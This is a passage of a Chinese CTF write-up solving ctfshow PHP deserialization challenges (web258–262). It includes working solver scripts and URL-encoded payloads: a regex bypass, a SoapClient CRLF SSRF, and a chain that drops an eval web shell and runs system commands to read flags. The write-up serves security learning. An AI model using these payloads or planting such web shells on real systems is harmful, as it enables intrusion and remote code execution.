punctuation">&#125;</span></span></code></pre><p>多了正则过滤<code>/[oc]:\d+:/i</code> 还有个小改动，<strong>把原来的private改成了public</strong></p><p>这个正则表达式<code>&#39;/[oc]:\d+:/i&#39;</code>可以分解为几个部分来解释：</p><ol><li><code>/</code>：正则表达式的开始和结束通常使用斜杠<code>/</code>来标记，但在字符串中使用时，需要使用转义字符<code>\</code>来避免与字符串的结束标记混淆。</li><li><code>[oc]</code>：这是一个字符集，表示匹配方括号内的任意一个字符。在这个例子中，它可以匹配字母<code>o</code>或<code>c</code>。</li><li><code>:</code>：这个字符字面上表示它自己，即冒号。</li><li><code>\d+</code>：<code>\d</code>是一个特殊字符，代表任意一个数字（0-9）。<code>+</code>是一个量词，表示前面的字符或字符集可以出现一次或多次。所以<code>\d+</code>表示匹配一个或多个数字。</li><li><code>:</code>：同上，表示字面上的冒号。</li><li><code>/i</code>：<code>i</code>是一个修饰符，表示不区分大小写。这意味着<code>[oc]</code>可以匹配<code>O</code>或<code>o</code>或<code>C</code>或<code>c</code>。</li></ol><p>将这些部分组合起来，这个正则表达式可以匹配形如<code>/o123:</code>或<code>/c456:</code>的字符串，其中<code>o</code>或<code>c</code>后面跟着一个或多个数字，然后是一个冒号。例如，它可以匹配<code>/oc:12345/</code>或<code>/O987:</code>。</p><p>可以利用unserialize的特性在数字前面加上 <code>+</code> 即可，这里正则替换一下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([oc]):(\d+:)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$1</span></span>:+<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span>fl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:+11:"ctfShowUser":1:&#123;s:5:"class";O:+8:"backDoor":1:&#123;s:4:"code";s:18:"system("tac fl*");";&#125;&#125;</span></code></pre><h4 id="web259-HTTP-SoapClient-CRLF-SSRF"><a href="#web259-HTTP-SoapClient-CRLF-SSRF" class="headerlink" title="web259(HTTP  SoapClient+CRLF+SSRF)"></a>web259(HTTP  SoapClient+CRLF+SSRF)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>没找到可以反序列化的类，但是根据提示伪造ip后访问flag.txt可以得到flag，感觉考的是HTTP</p><p>看了大佬wp考的是php原生类<code>SoapClient</code>+<code>CRLF</code>实现<code>SSRF</code></p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">从一道题学习SoapClient与CRLF组合拳</a></p><p><strong>CRLF注入攻击</strong></p><p>CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分</p><p>隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，</p><p>这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p><p><strong>本题需要重点关注的析构函数</strong></p><p><code>__call</code> 在对象中调用一个不可访问方法时调用<br>在这道题中<code>$vip-&gt;getFlag();</code>因为调用了类中没有的方法所以会导致<code>__call</code>的执行<br>本题需要用到的函数<br><a href="https://www.php.net/manual/zh/soapclient.call.php">SoapClient::__call</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'hsad^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"ssrf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>序列化出来的东西需要包含字符串ctfshow_i_love_36D，<br>直接传ctfhsow&#x3D;ctfshow_i_love_36D试试，成功回显flag。</p><h4 id="web261-unserialize"><a href="#web261-unserialize" class="headerlink" title="web261(__unserialize)"></a>web261(__unserialize)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">PHP 文档</a>中提到</p><blockquote><p>注意:<br>如果类中同时定义了<code> __unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup() </code>方法会被忽略。<br>注意:<br>此特性自 PHP 7.4.0 起可用。</p></blockquote><p>查看 <code>response header</code> 可知 <code>X-Powered-By: PHP/7.4.16</code>，那么 <code>__wakeup</code> 部分就不会被执行，与注释无异。<br><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>vip<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowvip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22877.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token operator">%</span><span class="token number">40</span>eval<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B1<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token number">877.</span>php       <span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag_is_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web262-反序列化字符串逃逸"><a href="#web262-反序列化字符串逃逸" class="headerlink" title="web262(反序列化字符串逃逸)"></a>web262(反序列化字符串逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>message.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>根据message.php提示，Cookie传入构造好的msg即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition 